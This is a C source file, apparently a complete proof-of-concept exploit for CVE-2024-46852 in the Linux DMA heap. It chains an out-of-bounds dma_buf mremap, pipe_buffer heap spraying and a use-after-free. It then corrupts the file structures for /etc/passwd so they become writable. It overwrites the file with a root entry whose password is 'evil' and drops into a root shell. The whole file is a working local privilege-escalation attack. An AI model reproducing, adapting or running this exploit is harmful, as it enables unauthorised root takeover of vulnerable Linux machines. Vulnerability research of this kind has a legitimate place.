#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/dma-buf.h>
#include <linux/dma-heap.h>
#include <sys/ipc.h>
#include <sys/resource.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define PAGE_SIZE 0x1000
#define N_PAGES (64) //total allocation size 64*8 = 512 -> kmalloc-512
#define N_PIPEBUF_PAGES (8) //total allocation size 8*40 = 320 -> kmalloc-512
#define SPRAY_MAPS 0x1000
#define SPRAY_SIZE PAGE_SIZE
#define FILE_NUM 0x100
#define PIPE_NUM 0x200

void *new_dma_map = NULL;
char *ptr;
volatile int start_trigger = 0;

int pipe_fd[PIPE_NUM][2];
int file_fd[FILE_NUM];
size_t find_pipe[PIPE_NUM][2];
int same_pipe[2];

void hexdump(char* addr, size_t len)
{
    const size_t line_size=32;
    const size_t group_by = 8;
    size_t off = 0;
    int64_t rem = len;
    printf("hexdump@%p:\n",addr);
    while(rem)
    {
        printf("+0x%04lx:", off);
        for(int l_cnt=0; l_cnt<line_size && rem; l_cnt++,off++,rem--)
        {
            if((l_cnt%group_by)==0)
                printf(" ");
            printf("%02hhx", addr[off]);
        }
        printf("\n");
    }
}

void errExit(char *msg)
{
    printf("\033[31m\033[1m[x] Error: %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}

void adjust_rlimit() {
    struct rlimit rlim;
    rlim.rlim_cur = rlim.rlim_max = (200 << 20);
    setrlimit(RLIMIT_AS, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 32 << 20;
    setrlimit(RLIMIT_MEMLOCK, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 136 << 20;
    rlim.rlim_cur = rlim.rlim_max = 1 << 20;
    setrlimit(RLIMIT_STACK, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 0;
    setrlimit(RLIMIT_CORE, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 4096;
    setrlimit(RLIMIT_NOFILE, &rlim);
}

void unshare_setup(uid_t uid, gid_t gid) {
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
}

void set_cpu_affinity(int cpu_n, pid_t pid) {
    cpu_set_t *set = malloc(sizeof(cpu_set_t));
    CPU_ZERO(set);
    CPU_SET(cpu_n, set);
    sched_setaffinity(pid, sizeof(set), set);
    free(set);
}


void* spray_pages[SPRAY_MAPS];
void spray_heap_pages() {
    for (int i = 0; i < SPRAY_MAPS; i++) {
        spray_pages[i] = mmap(NULL, SPRAY_SIZE, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (spray_pages[i] == MAP_FAILED) {
            perror("[-] mmap spray");
            exit(EXIT_FAILURE);
        }
    }
    puts("[*] heap spray done");
}

int main(int argc, char **argv, char **envp) {
    puts("[+] CVE-2024-46852 POC by bam0x7");

    unshare_setup(getuid(), getgid());
    set_cpu_affinity(0, getpid());
    adjust_rlimit();

    long page_size = sysconf(_SC_PAGE_SIZE);

    puts("[*] open /dev/dma_heap/system device");
    int dev_fd = open("/dev/dma_heap/system", O_RDWR);
    if (dev_fd < 0) {
        perror("[-] /dev/dma_heap/system");
        return -1;
    }

    for(int i = 0; i < PIPE_NUM; i++)
    {
        if(pipe(pipe_fd[i]) < 0)
        {
            errExit("PIPE_ERROR.");
        }
    }

    for(int i = 0; i < PIPE_NUM; i++)
    {
        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, PAGE_SIZE*N_PIPEBUF_PAGES) < 0) {
            printf("[x] failed to extend %d pipe!\n",i);
            return -1;
        }
    }

    puts("[*] allocating pipe pages...");
    for (int i = 0; i < PIPE_NUM; i++) {
        size_t magic_num = 0xdead0000+i;
        write(pipe_fd[i][1], &magic_num, 8);
        write(pipe_fd[i][1], "bambamx7", 8);
        // write(pipe_fd[i][1], &magic_num, sizeof(int));
        //write(pipe_fd[i][1], &magic_num, sizeof(int));
        write(pipe_fd[i][1], "bambamx7", 8);
        //write(pipe_fd[i][1], "bambamx7", 8);  /* prevent pipe_release() */
    }

    puts("[*] Create 4 holes in pipe_buffer...");
    for (int i = 0; i < PIPE_NUM; i += (PIPE_NUM/4))
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }

    struct dma_heap_allocation_data dma = {
        .fd_flags = O_RDWR,
        .len = PAGE_SIZE * N_PAGES,
    };

    if (ioctl(dev_fd, DMA_HEAP_IOCTL_ALLOC, &dma) < 0) {
        perror("[-] DMA_HEAP_IOCTL_ALLOC");

    }

    int dma_fd = dma.fd;
    void *dma_heap_map = mmap(NULL, PAGE_SIZE * N_PAGES, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, 0);
    if (dma_heap_map == MAP_FAILED) {
        perror("[-] mmap(dma_heap_map)");
        close(dma_fd);
    }

    printf("[+] dma_buff at: %p\n" ,dma_heap_map);

    void *new_dma_map = mremap(dma_heap_map, PAGE_SIZE*N_PAGES, PAGE_SIZE * (N_PAGES+1), MREMAP_MAYMOVE);
    if (new_dma_map == MAP_FAILED) {
        perror("[-] mremap");
        munmap(dma_heap_map, PAGE_SIZE);
        close(dma_fd);
    }
    printf("[+] extend dma_buff at: %p\n" ,new_dma_map);

    char* target_page = new_dma_map + PAGE_SIZE*N_PAGES;

    volatile char dummy_char;
    dummy_char = *(target_page);

    printf("[+] access OOB at: %p\n" ,new_dma_map);

    *target_page = 0;
    
    for (int i = 0; i < PIPE_NUM; i++)
    {
        if(i % (PIPE_NUM / 4) != 0)//can't equal to the hole
        {
            read(pipe_fd[i][0],find_pipe[i],0x10);
        }
    }

    size_t victim_id = 0;
    size_t prev_id = 0;
    size_t magic = 0;
    char *tmp_content = malloc(0x1000);
    size_t buf[0x1000];
    int SND_PIPE_BUF_SZ = 96*2;
    size_t snd_pipe_sz = 0x1000 * (SND_PIPE_BUF_SZ/0x28);

    int is_found = 0;
    // puts("[*]finding...");
    for (int i = 0; i < PIPE_NUM&&!is_found; i++)
    {
        if(i % (PIPE_NUM / 4) !=0)//can't equal to the hole
        {
            if(find_pipe[i][0] != 0xdead0000 + i && !strncmp(&find_pipe[i][1],"bambamx7",8))
            {
                same_pipe[0] = find_pipe[i][0]-0xdead0000;
                same_pipe[1] = i;//previous
                // if(same_pipe[0]>PIPE_NUM||same_pipe[0]-same_pipe[1]==1||same_pipe[1]-same_pipe[0]==1)
                if(same_pipe[0]>PIPE_NUM)
                {
                    puts("[*]pipe idx out of range."); 
                    return -1;
                }
                puts("[+]+++++++++++++++++++++++++++++++++++[+]");
                printf("[+] found pipe at idx:%d and %d\n",same_pipe[0],same_pipe[1]); 
                puts("[+]+++++++++++++++++++++++++++++++++++[+]");
                is_found=1;
            }   
        }
        
    }
    if(!is_found)
    {
        perror("[*] Not found two pipe.");
        return -1;
    }

    char dummy_buf[2*PAGE_SIZE] = {0};
    memset(dummy_buf,0x41,sizeof(dummy_buf));

    /*write something to alarge the pipe_read size after*/
    // write(pipe_fd[same_pipe[1]][1], buf,0x500);
    puts("[*] uaf one of the pipe_buffer");
    const int written_size = 3*8;
    const int read_size = 2*8;
    //firzen: we fully write the page and then read it back so that the pipe_buf frees the page
    write(pipe_fd[same_pipe[1]][1], dummy_buf,PAGE_SIZE-written_size);
    read(pipe_fd[same_pipe[1]][0], dummy_buf,PAGE_SIZE-read_size);
  
    //munmap(new_dma_map, PAGE_SIZE * N_PAGES + PAGE_SIZE);
    madvise(target_page,PAGE_SIZE, MADV_DONTNEED);


    
    // getchar();
    //close(pipe_fd[same_pipe[0]][0]);
    //close(pipe_fd[same_pipe[0]][1]);

    // puts("[*]press enter to put the pwd file page cache into the uaf page");
    puts("[*] Spray pwd file struct...");
    //008000001d800a00
    //008000001d800a00
    //0200000003000a00
    for (int i = 0; i < FILE_NUM; i++) 
    {
        file_fd[i] = open("/etc/passwd",O_RDONLY);
        if (file_fd[i] < 0) 
        {
            perror("FAILED to open pwd file!");

            munmap(new_dma_map, PAGE_SIZE * 2);
            close(dma_fd);
            close(dev_fd);
            return -1;
        }
    }

    //we'll fault back in our page and print what's in there

    hexdump(target_page, 0x200);

    void** ptrs_in_page = (void**)target_page;
    void** page_end = (void**)(target_page+PAGE_SIZE);
    //const size_t last_fops_nibbles = 0xb20; //pipefifo_fops
    const size_t last_fops_nibbles = 0xb40;
    //const size_t last_fops_nibbles = 0x7c0;
    int found_file = 0;

    while(ptrs_in_page < page_end-10 && !found_file)
    {
        void* curr_val = *ptrs_in_page;
        //If we found the right file in our map
        if(curr_val>(void*)0xffffff0000000000ULL)
        { 
            if(((uint64_t)curr_val & 0xfff) == last_fops_nibbles)
            {
                printf("[+] Found what looks like the right file\n");
                found_file = 1;
                //Overwrite the mode flags
                ptrs_in_page[3] = (void*)(0x2e0003ULL<<32);
            }
            //ptrs_in_page[0] = NULL; //Cause crash to get an idea of what we overwrote
        }
        ptrs_in_page++;
    }

    if(found_file)
    {
        char *data = "root:$1$evil$B1cg.QF41pkr9LUa9L0vm1:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt evil evil
        printf("[*] Setting root password to \"evil\"...\n");
        int data_size = strlen(data);

        //If it worked we can just write to /etc/passwd now, so we will do that
        for (int i = 0;i < FILE_NUM; i++) {
            if(write(file_fd[i], data,data_size)>0)
            {
                ftruncate(file_fd[i], data_size);
                break;
            }
        }

        puts("[*]Now the pwd is:"); 
        system("cat /etc/passwd");

        system("sh");
    }

    return 0;
}
